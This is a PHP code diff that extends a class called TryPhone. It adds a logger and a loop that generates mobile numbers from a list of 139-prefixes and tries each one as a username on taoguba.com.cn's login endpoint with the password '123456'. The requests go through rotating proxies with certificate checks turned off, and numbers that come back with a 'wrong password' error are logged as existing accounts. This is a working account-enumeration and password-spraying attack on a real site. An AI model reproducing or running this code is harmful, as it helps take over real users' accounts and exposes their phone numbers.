@@ -51,13 +51,25 @@ class TryPhone
 		return "";
 	}
 
-	/**
-	 * @return bool
-	 */
-	public static function taoguba_phone($jsonString)
+	public static function logFile($msg, $funcName = '', $line = '', $filename = "try_phone")
+	{
+		if (is_array($msg)) {
+			$msg = json_encode($msg, JSON_UNESCAPED_UNICODE);
+		}
+		if ($funcName) {
+			$msg = $funcName . ' ' . $line . ': ' . $msg;
+		} else {
+			$msg = 'message: ' . $msg;
+		}
+		$fileName = AppUtil::logDir() . 'phone_' . $filename . date('Ymd') . '.log';
+		@file_put_contents($fileName, PHP_EOL . date('Y-m-d H:i:s') . ' ' . $msg . PHP_EOL, FILE_APPEND);
+	}
+
+
+	public static function taoguba_phone($data)
 	{
 		$ip_port = self::get_proxy();
-		echo '$ip_port=>' . $ip_port . PHP_EOL;
+		self::logFile('$ip_port=>' . $ip_port, __FUNCTION__, __LINE__);
 		if (!$ip_port) {
 			return false;
 		}
@@ -72,17 +84,16 @@ class TryPhone
 		curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC); //代理认证模式
 		curl_setopt($ch, CURLOPT_PROXY, $arrip[0]); //代理服务器地址
 		curl_setopt($ch, CURLOPT_PROXYPORT, $arrip[1]); //代理服务器端口
-		curl_setopt($ch,CURLOPT_PROXYTYPE,CURLPROXY_HTTP);
+		curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
 		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
 		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
-
 
 		curl_setopt($ch, CURLOPT_TIMEOUT, 3000);//设置超时时间
 		curl_setopt($ch, CURLOPT_COOKIE, self::COOKIE);
 
 		curl_setopt($ch, CURLOPT_POST, 1);
 		$postdata = "";
-		foreach ($jsonString as $key => $value) {
+		foreach ($data as $key => $value) {
 			$postdata .= ($key . '=' . $value . '&');
 		}
 		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
@@ -101,6 +112,7 @@ class TryPhone
 			]);
 
 		$response = curl_exec($ch);
+		self::logFile($response, __FUNCTION__, __LINE__);
 		if ($response === false) {
 			$error_info = curl_error($ch);
 			curl_close($ch);// 关闭curl
@@ -109,5 +121,60 @@ class TryPhone
 			curl_close($ch);//关闭 curl
 			return $response;
 		}
+	}
+
+	public static function phone_section()
+	{
+
+		$phone_section = [
+			1390009,
+			1390010,
+			1390011,
+			1390012,
+			1390028,
+			1390085,
+			1390097,
+			1390099,
+			1390100,
+			1390101,
+			1390102,
+			1390103,
+			1390104,
+			1390105,
+			1390106,
+			1390107,
+			1390108,
+			1390109,
+		];
+		foreach ($phone_section as $p) {
+			self::combind_phone($p);
+		}
+	}
+
+	public static function combind_phone($p)
+	{
+		for ($i = 0; $i < 9999; $i++) {
+			$phone = $p * 10000 + $i;
+			self::req($phone);
+		}
+	}
+
+	public static function req($phone)
+	{
+		$data = [
+			'userName' => $phone,
+			'password' => "123456",
+			'save' => "Y",
+			'url' => "https://www.taoguba.com.cn/index?blockID=1",
+		];
+		$ret = TryPhone::taoguba_phone($data);
+		self::logFile(['phone' => $phone, 'ret' => $ret], __FUNCTION__, __LINE__, 'logs');
+		if ($ret) {
+			$ret = json_decode($ret, 1);
+			if (isset($ret['errorMessage']) && $ret['errorMessage'] == "密码错误") {
+				self::logFile(['phone' => $phone], __FUNCTION__, __LINE__, 'yes');
+			}
+		}
+
 	}
 }
